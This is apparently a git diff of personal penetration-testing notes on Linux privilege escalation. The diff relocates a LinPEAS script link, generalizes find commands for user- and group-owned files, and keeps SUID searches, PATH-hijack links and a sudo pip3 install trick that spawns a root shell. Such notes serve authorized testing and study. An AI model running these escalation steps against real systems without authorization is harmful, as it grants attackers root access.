@@ -17,6 +17,7 @@ https://book.hacktricks.xyz/linux-unix/privilege-escalation
 - Dmesg signature verification failed error?
 - More system enum (date, system stats, cpu info, printers)
 - Enumerate more defenses
+	- #LinPEAS: https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
 
 
 # Sticky-Bit
@@ -33,8 +34,8 @@ find / -user root -perm -4000 -exec ls -ldb {} \;
 
 # Find files belonging to user
 
-`find / -user low 2>/dev/null | egrep -v "proc|venv"`
-`find / -group low 2>/dev/null | egrep -v "proc|venv"`
+`find / -user <user> 2>/dev/null | egrep -v "proc|venv"`
+`find / -group <group> 2>/dev/null | egrep -v "proc|venv"`
 
 # Exploit via Path if SUID-Binary does not use full path
 https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/
@@ -52,5 +53,3 @@ echo "import os;os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" 
 sudo -H /usr/bin/pip3 install $TF
 ```
 
-# LinPEAS
-https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
